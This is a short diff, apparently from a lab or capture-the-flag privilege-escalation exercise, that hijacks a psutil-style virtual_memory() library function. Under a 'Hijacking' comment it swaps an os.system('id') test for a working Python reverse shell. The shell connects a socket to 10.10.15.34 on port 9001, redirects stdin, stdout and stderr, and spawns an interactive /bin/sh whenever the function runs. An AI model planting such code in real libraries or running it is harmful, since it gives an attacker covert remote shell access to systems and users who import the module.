@@ -36,9 +36,12 @@ def virtual_memory():
 
 	...SNIP...
 	#### Hijacking
-	import os
-	os.system('id')
-	
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("10.10.15.34", 9001))  # Replace with your IP and port
+        os.dup2(s.fileno(), 0)  # stdin
+        os.dup2(s.fileno(), 1)  # stdout
+        os.dup2(s.fileno(), 2)  # stderr
+        subprocess.call(["/bin/sh", "-i"])
 
     global _TOTAL_PHYMEM
     ret = _psplatform.virtual_memory()
